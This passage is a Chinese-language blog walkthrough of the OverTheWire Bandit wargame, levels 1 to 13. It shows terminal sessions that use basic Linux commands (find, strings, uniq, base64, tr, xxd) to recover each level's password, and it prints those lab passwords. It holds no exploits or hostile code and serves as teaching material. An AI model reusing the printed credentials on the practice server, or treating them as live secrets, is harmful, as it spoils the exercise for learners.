(https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! Level 1 lsä¹‹åå¾—åˆ°flagï¼Œå³ä¸‹ä¸€å…³çš„å¯†ç ï¼ˆä¸çŸ¥é“ä¸ºå•¥windowsçš„CMDä¸€ç›´ç™»é™†ä¸ä»…\nå»ºè®®ç”¨linux,windowsæ˜¯ç„å­¦\n1 2  bandit0@bandit:~$ cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1   wargameçš„åŸç†å°±æ˜¯ä¸Šä¸€å…³çš„flagæ˜¯ä¸‹ä¸€å…³sshçš„å¯†ç \nLevel 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  bandit1@bandit:~$ ls - bandit1@bandit:~$ cd - -bash: cd: OLDPWD not set bandit1@bandit:~$ cd \\- -bash: cd: OLDPWD not set bandit1@bandit:~$ cd /- -bash: cd: /-: No such file or directory bandit1@bandit:~$ ls -al total 24 -rw-r----- 1 bandit2 bandit1 33 Oct 16 2018 - drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit1@bandit:~$ cat /- cat: /-: No such file or directory bandit1@bandit:~$ cat ./- CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9   åˆšå¼€å§‹ä»¥ä¸º-æ˜¯ä¸€ä¸ªç›®å½•ï¼Œä¾¿å»cdï¼Œç»“æœæ˜¯oldpwd not setï¼Œç™¾åº¦ä¹‹åå‘ç°æ˜¯è¿”å›ä¸Šä¸€ä¸ªç›®å½•\nlsæŸ¥çœ‹äº†æ‰çŸ¥é“æ˜¯æ˜¯ä¸€ä¸ªæ–‡ä»¶\n bashä¸­ï¼Œ-ä¼šè¢«è§£æä¸ºstdinï¼Œå³æ ‡å‡†è¾“å‡ºæµï¼Œå‡å¦‚ç›´æ¥$ cat -ï¼Œè¿™æ¡å‘½ä»¤ä¼šå›æ˜¾è¾“å…¥çš„ä»»æ„å­—ç¬¦ï¼ŒçŸ¥é“è¾“å…¥eof\næ‘†è„±è½¬ä¹‰çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨ç›¸å¯¹è·¯å¾„æˆ–è€…ç»å¯¹è·¯å¾„\n level 3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  bandit2@bandit:~$ ls spaces in this filename bandit2@bandit:~$ ls -al total 24 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile -rw-r----- 1 bandit3 bandit2 33 Oct 16 2018 spaces in this filename bandit2@bandit:~$ cat spaces\\ in\\ this\\ filename UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK bandit2@bandit:~$ cat \"spaces in this filename\" UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK bandit2@bandit:~$ cat 'spaces in this filename' UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK   æ€»æ‰€å‘¨çŸ¥ï¼Œlinuxæ–‡ä»¶åä¸­å‡å¦‚æœ‰ç©ºæ ¼çš„è¯ï¼Œç›´æ¥è¾“å…¥è‚¯å®šæ˜¯æ‰“ä¸å¼€çš„\næˆ‘è¿™è¾¹ç›´æ¥ç”¨tabï¼Œè¡¥å…¨äº†æ‰€æœ‰å¯¹ç©ºæ ¼çš„è½¬ä¹‰\nå½“ç„¶ï¼Œç”¨å¼•å·åŒ…å«ä¹Ÿè¡Œ\n https://unix.stackexchange.com/questions/148043/is-space-not-allowed-in-a-filename\n ä¸€èˆ¬æ¥è¯´linuxå’Œunixä¸Šåº”è¯¥é¿å…æ–‡ä»¶åä¸­åŒ…å«ç©ºæ ¼çš„\nlevel 4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  bandit3@bandit:~$ ls -al total 24 drwxr-xr-x 3 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc drwxr-xr-x 2 root root 4096 Oct 16 2018 inhere -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit3@bandit:~$ bandit3@bandit:~$ cd inhere bandit3@bandit:~/inhere$ ls -al total 12 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 3 root root 4096 Oct 16 2018 .. -rw-r----- 1 bandit4 bandit3 33 Oct 16 2018 .hidden bandit3@bandit:~/inhere$ cat .hidden pIwrPrtPN36QITSp3EQaw936yaFoFgAB   çœ‹æ¥ï¼Œç›´æ¥ls -al æ˜¯ä¸ªå¥½ä¹ æƒ¯\nè¿™é¢˜åº”è¯¥è€ƒå¯Ÿçš„æ˜¯linux çš„éšè—æ–‡ä»¶ï¼Œlinuxçš„éšè—æ–‡ä»¶éƒ½ä»¥.å¼€å¤´\nlevel 5 bandit4@bandit:~$ ls -al total 24 drwxr-xr-x 3 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc drwxr-xr-x 2 root root 4096 Oct 16 2018 inhere -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit4@bandit:~$ cd inhere/ bandit4@bandit:~/inhere$ ls -al total 48 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 3 root root 4096 Oct 16 2018 .. -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file00 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file01 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file02 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file03 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file04 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file05 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file06 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file07 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file08 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file09 bandit4@bandit:~/inhere$ cat ./-file00 ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½~%\tC[ï¿½ê±±\u003eï¿½ï¿½| ï¿½ bandit4@bandit:~/inhere$ cat ./-file01 ï¿½ï¿½ï¿½U\"7ï¿½wï¿½ï¿½ï¿½Hï¿½ï¿½Ãªï¿½Qï¿½ï¿½ï¿½ï¿½(ï¿½ï¿½ï¿½#ï¿½ï¿½ï¿½ bandit4@bandit:~/inhere$ cat ./-file02 ï¿½Tï¿½vï¿½ï¿½(ï¿½Ö´ï¿½ï¿½ï¿½ï¿½ï¿½A*ï¿½ 2Jï¿½ÅØ‡_ï¿½y7 bandit4@bandit:~/inhere$ cat ./-file03 ï¿½ï¿½.Aï¿½ï¿½uï¿½ï¿½#ï¿½ï¿½ï¿½w$N?cï¿½-ï¿½ï¿½Db3ï¿½ï¿½=ï¿½ï¿½ bandit4@bandit:~/inhere$ cat ./-file05 +ï¿½ï¿½pmï¿½ï¿½ï¿½;ï¿½ï¿½:Dï¿½ï¿½^ï¿½ï¿½@ï¿½glï¿½Qï¿½ bandit4@bandit:~/inhere$ cat ./-file04 ï¿½=\u003cï¿½Wï¿½ï¿½ï¿½ï¿½ï¿½htï¿½Zï¿½ï¿½!ï¿½ï¿½{ï¿½U ï¿½ bandit4@bandit:~/inhere$ cat ./-file06 ï¿½ï¿½@ï¿½%@ï¿½ï¿½ï¿½ZP*Eï¿½ï¿½1ï¿½Vï¿½ï¿½ï¿½Ì«*ï¿½ï¿½ï¿½ï¿½ bandit4@bandit:~/inhere$ cat ./-file07 koReBOKuIDDepwhWk7jZC0RTdopnAYKh bandit4@bandit:~/inhere$ å¤ªéš¾äº†ï¼Œé¢˜ç›®è¯´only human-readableï¼ŒçœŸçš„æ˜¯éå†10ä¸ªæ–‡ä»¶\nå½“ç„¶ç›´æ¥å°±æ‰¾åˆ°flagäº†\nlevel 6 1 2 3 4 5 6 7 8 9 10  bandit5@bandit:~/inhere$ ls maybehere00 maybehere04 maybehere08 maybehere12 maybehere16 maybehere01 maybehere05 maybehere09 maybehere13 maybehere17 maybehere02 maybehere06 maybehere10 maybehere14 maybehere18 maybehere03 maybehere07 maybehere11 maybehere15 maybehere19 bandit5@bandit:~/inhere$ du -a -b | grep 1033 1033\t./maybehere07/.file2 bandit5@bandit:~/inhere$ cat ./maybehere07/.file2 DXjZPULLxYr17uwoI01bNLQbtFemEgo7 bandit5@bandit:~/inhere$   ç»™å‡ºä¸‰ä¸ªæ¡ä»¶ï¼šå¯è¯»çš„ï¼Œå¤§å°ä¸º1033bytesï¼Œä¸å¯æ‰§è¡Œçš„\næ˜æ˜¾çš„ï¼Œåªæœ‰å¤§å°æœ€å¥½æœç´¢ï¼Œä½¿ç”¨å‘½ä»¤du -a -bæ˜¾ç¤ºå‡ºæ‰€æœ‰æ–‡ä»¶ï¼Œä»¥bytesä¸ºå•ä½çš„å¤§å°ï¼Œç„¶åä½¿ç”¨ç®¡é“è¿‡æ»¤æœç´¢å°±è¡Œäº†\nlevel 7  https://www.runoob.com/linux/linux-comm-find.html\nhttps://www.cnblogs.com/RXDXB/p/11696751.html\n æ‰¾æµ·é‡æ–‡ä»¶ç»ˆäºè¦ç”¨åˆ°äº†findå‘½ä»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67  bandit6@bandit:/home$ find / -user 'bandit7' -group 'bandit6' -size 33c find: â€˜/run/lvmâ€™: Permission denied find: â€˜/run/screen/S-bandit27â€™: Permission denied find: â€˜/run/screen/S-bandit25â€™: Permission denied find: â€˜/run/screen/S-bandit2â€™: Permission denied find: â€˜/run/screen/S-bandit16â€™: Permission denied find: â€˜/run/screen/S-bandit0â€™: Permission denied find: â€˜/run/screen/S-bandit20â€™: Permission denied find: â€˜/run/screen/S-bandit30â€™: Permission denied find: â€˜/run/screen/S-bandit14â€™: Permission denied find: â€˜/run/screen/S-bandit33â€™: Permission denied find: â€˜/run/screen/S-bandit13â€™: Permission denied find: â€˜/run/screen/S-bandit31â€™: Permission denied find: â€˜/run/screen/S-bandit8â€™: Permission denied find: â€˜/run/screen/S-bandit5â€™: Permission denied find: â€˜/run/screen/S-bandit4â€™: Permission denied find: â€˜/run/screen/S-bandit29â€™: Permission denied find: â€˜/run/screen/S-bandit28â€™: Permission denied find: â€˜/run/screen/S-bandit21â€™: Permission denied find: â€˜/run/screen/S-bandit26â€™: Permission denied find: â€˜/run/screen/S-bandit24â€™: Permission denied find: â€˜/run/screen/S-bandit22â€™: Permission denied find: â€˜/run/screen/S-bandit1â€™: Permission denied find: â€˜/run/screen/S-bandit19â€™: Permission denied find: â€˜/run/screen/S-bandit23â€™: Permission denied find: â€˜/run/shmâ€™: Permission denied find: â€˜/run/lock/temp/bandit31-gitâ€™: Permission denied find: â€˜/run/lock/temp/bandit30-gitâ€™: Permission denied find: â€˜/run/lock/temp/bandit29-gitâ€™: Permission denied find: â€˜/run/lock/temp/bandit28-gitâ€™: Permission denied find: â€˜/run/lock/temp/bandit27-gitâ€™: Permission denied find: â€˜/run/lock/temp/bandit5/inhereâ€™: Permission denied find: â€˜/run/lock/lvmâ€™: Permission denied find: â€˜/var/spool/bandit24â€™: Permission denied find: â€˜/var/spool/rsyslogâ€™: Permission denied find: â€˜/var/spool/cron/crontabsâ€™: Permission denied find: â€˜/var/logâ€™: Permission denied find: â€˜/var/tmpâ€™: Permission denied find: â€˜/var/cache/ldconfigâ€™: Permission denied find: â€˜/var/cache/apt/archives/partialâ€™: Permission denied /var/lib/dpkg/info/bandit7.password find: â€˜/var/lib/apt/lists/partialâ€™: Permission denied find: â€˜/var/lib/polkit-1â€™: Permission denied find: â€˜/cgroup2/csessionsâ€™: Permission denied find: â€˜/home/bandit28-gitâ€™: Permission denied find: â€˜/home/bandit30-gitâ€™: Permission denied find: â€˜/home/bandit31-gitâ€™: Permission denied find: â€˜/home/bandit5/inhereâ€™: Permission denied find: â€˜/home/bandit27-gitâ€™: Permission denied find: â€˜/home/bandit29-gitâ€™: Permission denied find: â€˜/tmpâ€™: Permission denied find: â€˜/lost+foundâ€™: Permission denied find: â€˜/rootâ€™: Permission denied find: â€˜/etc/ssl/privateâ€™: Permission denied find: â€˜/etc/lvm/backupâ€™: Permission denied find: â€˜/etc/lvm/archiveâ€™: Permission denied find: â€˜/etc/polkit-1/localauthorityâ€™: Permission denied find: â€˜/sys/fs/pstoreâ€™: Permission denied find: â€˜/proc/tty/driverâ€™: Permission denied find: â€˜/proc/29536/task/29536/fd/6â€™: No such file or directory find: â€˜/proc/29536/task/29536/fdinfo/6â€™: No such file or directory find: â€˜/proc/29536/fd/5â€™: No such file or directory find: â€˜/proc/29536/fdinfo/5â€™: No such file or directory find: â€˜/boot/lost+foundâ€™: Permission denied bandit6@bandit:/home$ cat /var/lib/dpkg/info/bandit7.password HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs   æ¯•ç«Ÿæ˜¯åˆ«äººçš„æœåŠ¡å™¨å˜›ï¼Œæ‰¾å‡ºå…¶ä¸­å¯ä»¥è®¿é—®çš„å°±æ˜¯ç›®æ ‡æ–‡ä»¶äº†\nlevel 8  stringsï¼šç”¨äºæ‰“å°æ–‡ä»¶ä¸­å¯æ‰“å°çš„å­—ç¬¦\n 1 2 3 4 5 6 7  bandit7@bandit:~$ ls data.txt bandit7@bandit:~$ less data.txt bandit7@bandit:~$ strings data.txt |grep millionth millionth\tcvX2JJa4CFALtqS87jk27qwqGhBM9plV bandit7@bandit:~$   ä¸€çœ‹è¿™é¢˜ç›®å°±æ„Ÿè§‰å¾ˆå¤§ï¼Œç”¨lessçœ‹ä¸‹æ ¼å¼ï¼Œç„¶åç›´æ¥ç”¨grepå»æŸ¥æ‰¾å°±è¡Œäº†\ncatå‘½ä»¤åœ¨è¿™ä¹Ÿæ˜¯å¯ä»¥å’Œstringsäº’æ¢çš„\nlevel 9  uniq å‘½ä»¤ç”¨äºæ£€æŸ¥åŠåˆ é™¤æ–‡æœ¬æ–‡ä»¶ä¸­é‡å¤å‡ºç°çš„è¡Œåˆ—ï¼Œä¸€èˆ¬ä¸ sort å‘½ä»¤ç»“åˆä½¿ç”¨ uniq å¯æ£€æŸ¥æ–‡æœ¬æ–‡ä»¶ä¸­é‡å¤å‡ºç°çš„è¡Œåˆ—\nhttps://www.runoob.com/linux/linux-comm-uniq.html\nsortå‘½ä»¤ç”¨äºå°†æ–‡æœ¬æ–‡ä»¶å†…å®¹åŠ ä»¥æ’åº sortå¯é’ˆå¯¹æ–‡æœ¬æ–‡ä»¶çš„å†…å®¹ï¼Œä»¥è¡Œä¸ºå•ä½æ¥æ’åº\nhttps://www.runoob.com/linux/linux-comm-sort.html\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105  bandit8@bandit:~$ cat data.txt | sort | uniq -c 10 07iR6PwHwihvQ3av1fqoRjICCulpoyms 10 0ob6rCn4D4jQ6KCiaT5hmOdWFrm2quR1 10 1drBmDT7PYS7hVgoTWkJSjUZUK7ZAIAa 10 1JnkIYLDOdn5M7TGabYxOWkn7HazMjYW 10 1wBrW0VGjKeYiXltbEWrUipwSHQfTu44 10 2Dxbtw8cnKyHwvt0lfFNYOGc4cE59uua 10 2TRkCQhbMjcM0hwL31NnJQ0DVagWN3Ca 10 4c7EsUtqLnLR9hiepV5EQVhdMgyi8onL 10 4cQDXE4IPH8fCBUBZaTPgnY2gwnPnlj6 10 6495bfC0lI1Qkw5kzZHnbVWooaOZHLvj 10 6rEzM4Qro8dH0e3uemAyYseTiNiNAYap 10 78rgduVcLZjLzZmooObdaN541MKV6IfQ 10 8qkrbCAUG9I28M49j9flUro5fWxenFzF 10 aIl4xN5maZVCQITz0xH0KNXIlLc0MhNf 10 aPsCQmSWVYGQQHUD6k1fHC2kqSyMlxwV 10 awglWaTRSAWBcol8hSMTJP4FYhIGJHVO 10 bCJdTkork5IRbZaaPZK0WVPgYIIO4mHF 10 BPl0XNou7xAZAI5fdzWzSmPkW1PnvTE1 10 bvIaDTzHBOGSO7CfpH9vUrJRRlwYTUA7 10 CS8HVrDmKGLG53qziqQCLWNRlUP1FHsV 10 CwwHDVp0pO6zmFp87L9AtFzqU5aB5j9w 10 CyziIvGRdotoy9yA00RAnvvkvrYdKCPp 10 DRqDxJYAv7IUfAMmrXtXEiz63TUjqeDn 10 DXI6y5CNPU06rVpkoZgnZJBWfkdW131j 10 enNw6tuj8mSxxS7f2Yd05puXVeuCZ39G 10 ewllxPExW9eaHxAH8WZkW9lDuK5cZcUy 10 eyKcuNPKnjt25kaOZxkMYQ9xqp45aIk9 10 fIBXc239DbhORY4t9xjgi7fSm4thHsIb 10 fiK30QpqzoULACXZwkBEKJZvpPQx9Uqm 10 FlHOKVUDNLx6Ga7CxC4ISRYNflN1GAnF 10 G4BHP66B4l3XkvB05CMgzrEKyjHhuCwz 10 gCx35PlKn08nrFFrAgHYLrUVWWZjLdqM 10 GEzwi36aKB8PLlCPH2wzl9gHzVm97IYu 10 glONDdR72FJL3Gc03nVNO4PKNzXFGH1A 10 gqGBgY1IdFDGG2XzB2o1VNGY4j6OL76V 10 h7jtcUsBhrryyLhtt1mT6Jdmp0l6ozBs 10 HKryX0XX2HT4WBT0OUzRz5Ac5B2rvIHU 10 iM3PaCO3VAxAdbdVsdGtEwuwrFQPYJV7 10 irGm6F73sbUrFhHukhp6JXgMQyLxJTz1 10 jtNdk5KDgrMkxgbZSJOvjOcM58svrzDY 10 jVscZ5eK5DWN7IvDSehXmyplCXRSbHJS 10 KerqNiDbY0zV2VxnOCmWX5XWxumldlAe 10 kha3sCpHsydUNrxLLXV3cFqWyucGjdxr 10 kt1VUEZpimCS4BaoAvhN3rgHOmhqaMIR 10 KUzqHCrxHSpgfkF5ZAzUfjlBaXW3zIaZ 10 L0nxAwlfV9V3J5onKIT8KYQ9InTcQ7yE 10 lnB8MWOYjETxoC8bQYrMFnxxQXAWHjP4 10 lZ9DhnzeHgIuLqYPmNzONpMCkuBYoeJI 10 M8JMUd7MSd4mOwZj1843ejBH5RXJOloa 10 mdug9JbW836YVZh3ALULBAxODlinqonJ 10 MIpMch66sYTmmqepKYczlRA9aJrnkt68 10 MpAqsgjJIVLT1MxSZcRoOOzl6g1db98Q 10 MQrydyojsVIYJSY8y1nCMjZGxnL1My7F 10 MsxcvOe3PGrt78wpZG2bBNF5wfXpZhET 10 n5fEmvCXKbJErzIDt3MLTmZZVMRNynrR 10 NL91hwGrqW5lVgoicb592Sd0djnHnbjZ 10 Nnih4Q0jf3xEOTcmM3yw2HkOm3VPox0w 10 NT4p09XwRb0k0wG9yIuvfs3MblMGpMc1 10 nU5zbsdUfmzv7cjNwkV9Hgb65OVe5EDt 10 nyvBweoC3kzt5QRTjbDfrWO7jhwOGN4g 10 OcVxHzDW027KWNFS03G31KQEb5TgN1WV 10 peXkYozDKE2u2BEOed5vvkY0nyjkGawn 10 PXHEt0PztCiArDZ7UCBmqKdBCiXNQWBN 10 QmFayGbrzFoiQ5Z2PGmnD2N6Pf77cxl9 10 QNTac9UtCmQ5VGAnzj10Z9BwV4TuaVvu 10 qsbKthWb80f3vQKBP7O12SjfFo1V5VkL 10 quhCb8ZIUJXXM2SbY1ER1D5GaDlQjdDa 10 QYeOFhgJCJEfKM1ZpT0K322R6SuKdCFT 10 r0VIMA1yzv838m7UfvutUhCf0zaY3Rqw 10 rfUNSGOvmQXz0m7PtFoEoPg1BpTbll7X 10 rJMbGeeDTMsj1RA4YibIQr0o9azHgP0I 10 rQAYnkKAXIViP4ROmehnDMIAXLpOOLEp 10 sBB2H7HateUFxr2oxrqUVoumFM60f1lj 10 SjFHXKRcIc7jlAYGknVMnGXSFd6xRmnF 10 tDZbF2SuhsvfaA3eTnwfcjQa1pZoPJeX 10 tiyVGzZcRwUPVAiqkroFMUbMI9ut9hcT 10 tLKyRATtoCuxMR4zZg1Dnlnr3je3bSHe 10 tmzBM5rcV9y7AM1xDHudL2yX9oefGieT 10 tWwjd16fG17vGdjutfOygVTjEGxlijOS 10 uBRx9inQTeaDZAuzEb2MadWXmkH8uW4O 1 UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR 10 vBo3qbjNEF2d3meGEkRfc3mKpjtiDz1i 10 VElUBEIhJ4yBgOBSN05WgtV2rF6kkGdz 10 vl9liaz8TKv1enUi0S2REhn01hKjjFIK 10 vVwG2mb8rU8eCuIlBhCJrZJ4GWR35nWY 10 W0vbGkT5mfRVWHAXCcMekevbenMJHFhN 10 W6pn7siBPh5G6ndjv1xx26iHxke8PviX 10 WaKxNQhiI9dXwvzB1PMpbQRy4CutGrWt 10 WbfstqfIvgiEuCVVuxwLgLyzUMtho2jP 10 WBjoFnis277W9vWB8M67h3z1glOYG2Fy 10 wSpAMdiBSeywE4d1DQZoSp5o8ZVOCqGP 10 wWfTfhYKmBkmyGH9D6Qjb6x7bMt5narC 10 x0bga8Oxz5lgM8k52HrYy4ez7XJI0lM0 10 XURYdoIx95clq6s90MORDydQ187DxQhS 10 xWmqkcrZ7TmjE7LKjqHVXSLw9fqsjYXp 10 XWy99VXVCnwdr780PK86hP6rBMkV5E3n 10 y9sn56N0ZhyxaySYRs518D4vqkMShHwb 10 YiQvaaidmD39i0ryGZz97Upc5NjgPklY 10 YR0sflfJZ34iuY3wM3DNNO19dBYnJDmt 10 yXGLvp7UaeiDKxLGXQYlWuRWdIgeCaT0 10 YzZX7E35vOa6IQ9SRUGdlEpyaiyjvWXE bandit8@bandit:~$ cat data.txt | sort | uniq -u UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR   è¿™é‡Œçš„çŸ¥è¯†æ˜¯linuxçš„æ–‡æœ¬å¤„ç†\nç”¨uniq -c ç»Ÿè®¡æ¯ä¸ªå­—ç¬¦ä¸²å‡ºç°çš„æ¬¡æ•°ï¼Œ-uå³å¯æ˜¾ç¤ºåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ä¸²\nlevel 10 æ‰¾å‡ºä»¥=å¼€å¤´çš„å­—ç¬¦å‡ºï¼Œå¯è¯»çš„\nç¬¬ä¸€ååº”æƒ³åˆ°çš„æ˜¯æ­£åˆ™è¡¨è¾¾å¼å’Œstringså‘½ä»¤ï¼Œå°è¯•äº†ä¸€ä¸‹ï¼Œç›´æ¥æˆåŠŸ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  bandit9@bandit:~$ strings data.txt |grep \"=.*\" 2========== the ========== password \u003et=\tyP rV~dHm= ========== isa =FQ?P\\U =\tF[ pb=x J;m= =)$= ========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk iv8!= bandit9@bandit:~$ bandit9@bandit:~$ strings data.txt |grep \"=\" 2========== the ========== password \u003et=\tyP rV~dHm= ========== isa =FQ?P\\U =\tF[ pb=x J;m= =)$= ========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk iv8!=   åé¢çœ‹åˆ«äººç›´æ¥grepä¹Ÿèƒ½æˆåŠŸï¼Œå¯çœŸæ˜¯å‡ºäººæ„æ–™\nè¿™è¾¹çš„çŸ¥è¯†ç‚¹åº”è¯¥æ˜¯grepæ˜¯æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²çš„\nlevel 11 1 2 3 4 5 6 7 8  bandit10@bandit:~$ strings data.txt | less bandit10@bandit:~$ strings data.txt VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg== bandit10@bandit:~$ cat data.txt VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg== bandit10@bandit:~$ strings data.txt | base64 -d The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR bandit10@bandit:~$   ç›´æ¥lessè¯»å–æ€•æ–‡ä»¶å¤ªå¤§ï¼Œç»“æœå°±åªæœ‰ä¸€è¡Œæ˜æ˜¾çš„base64åŠ å¯†\nç™¾åº¦äº†linuxä¸­base64å‘½ä»¤çš„ç”¨æ³•ï¼Œæ¯•ç«Ÿé¢˜æ„å°±æ˜¯è®©ç”¨linuxå‘½ä»¤è¿›è¡Œæ“ä½œçš„\nbase64ç”¨æ³•å¦‚ä¸‹\n1 2 3  $ echo \"Hello World\" | base64 SGVsbG8gV29ybGQK $ echo \"SGVsbG8gV29ybGQK\" | base64 -d   åŠ -dé€‰é¡¹ä¸ºè§£å¯†\nlevel 12 çœ‹é¢˜ç›®æ˜¯rot13åŠ å¯†ï¼Œå¦‚ä½•ç”¨linuxæŒ‡ä»¤å®ç°å‘¢\nè¿™é‡Œç”¨åˆ°äº†trå‘½ä»¤\n tr å‘½ä»¤ç”¨äºè½¬æ¢æˆ–åˆ é™¤æ–‡ä»¶ä¸­çš„å­—ç¬¦\ntr æŒ‡ä»¤ä»æ ‡å‡†è¾“å…¥è®¾å¤‡è¯»å–æ•°æ®ï¼Œç»è¿‡å­—ç¬¦ä¸²è½¬è¯‘åï¼Œå°†ç»“æœè¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡\nhttps://www.runoob.com/linux/linux-comm-tr.html\nhttps://www.xp.cn/php/2675.html\n 1 2 3 4 5  bandit11@bandit:~$ cat data.txt Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh bandit11@bandit:~$ cat data.txt | tr 'N-Z A-M n-z a-m' 'A-M N-Z a-m n-z' The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu bandit11@bandit:~$   level 13 æ®è¯´è¿™æ˜¯xxdå¯¼å‡ºçš„åå…­è¿›åˆ¶æ–‡ä»¶\næˆ‘ä»¬å»æœxxdå‘½ä»¤ï¼Œæ¢å¤æˆäºŒçº§åˆ¶ç”¨xxd -r filename\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116  bandit12@bandit:~$ mkdir /tmp/magicking bandit12@bandit:~$ cp data.txt /tmp/magicking/data.txt bandit12@bandit:~$ cd /tmp/magicking bandit12@bandit:/tmp/magicking$ ls data.txt bandit12@bandit:/tmp/magicking$ cat data.txt 00000000: 1f8b 0808 d7d2 c55b 0203 6461 7461 322e .......[..data2. 00000010: 6269 6e00 013c 02c3 fd42 5a68 3931 4159 bin..\u003c...BZh91AY 00000020: 2653 591d aae5 9800 001b ffff de7f 7fff \u0026SY............. 00000030: bfb7 dfcf 9fff febf f5ad efbf bbdf 7fdb ................ 00000040: f2fd ffdf effa 7fff fbd7 bdff b001 398c ..............9. 00000050: 1006 8000 0000 0d06 9900 0000 6834 000d ............h4.. 00000060: 01a1 a000 007a 8000 0d00 0006 9a00 d034 .....z.........4 00000070: 0d1a 3234 68d1 e536 a6d4 4000 341a 6200 ..24h..6..@.4.b. 00000080: 0069 a000 0000 0000 d003 d200 681a 0d00 .i..........h... 00000090: 0001 b51a 1a0c 201e a000 6d46 8068 069a ...... ...mF.h.. 000000a0: 6834 340c a7a8 3406 4000 0680 0001 ea06 h44...4.@....... 000000b0: 8190 03f5 4032 1a00 0343 4068 0000 0686 ....@2...C@h.... 000000c0: 8000 0320 00d0 0d00 0610 0014 1844 0308 ... .........D.. 000000d0: 04e1 c542 9ab8 2c30 f1be 0b93 763b fb13 ...B..,0....v;.. 000000e0: 50c4 c101 e008 3b7a 92a7 9eba 8a73 8d21 P.....;z.....s.! 000000f0: 9219 9c17 052b fb66 a2c2 fccc 9719 b330 .....+.f.......0 00000100: 6068 8c65 e504 5ec0 ae02 fa6d 16bc 904b `h.e..^....m...K 00000110: ba6c f692 356e c02b 0374 c394 6859 f5bb .l..5n.+.t..hY.. 00000120: 0f9f 528e 4272 22bb 103c 2848 d8aa 2409 ..R.Br\"..\u003c(H..$. 00000130: 